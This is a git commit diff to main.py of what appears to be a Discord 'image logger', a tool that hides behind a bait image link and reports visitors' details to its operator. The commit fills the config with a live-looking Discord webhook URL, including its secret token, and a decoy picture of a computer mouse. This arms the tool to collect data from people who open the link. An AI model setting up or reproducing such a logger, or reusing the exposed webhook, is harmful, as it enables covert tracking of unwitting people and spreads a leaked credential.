58fa16a1e320bf22806427bf762bacb7b5bcc6cb
Tantan4y7 <101494674+Tantan4y7@users.noreply.github.com>
2024-04-06 16:59:56 -0400

    Update main.py

--- main.py
+++ main.py
@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1226255214877872299/Caie4sh8n_UOwBDWMxFx-Tpzzg--hc8qqg0S-cb2v0txHG01LNvh8DGRkJdckyHvd0Sa",
+    "image": "https://www.minitool.com/images/uploads/2019/03/use-mouse-middle-click-button-windows-thumbnail.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
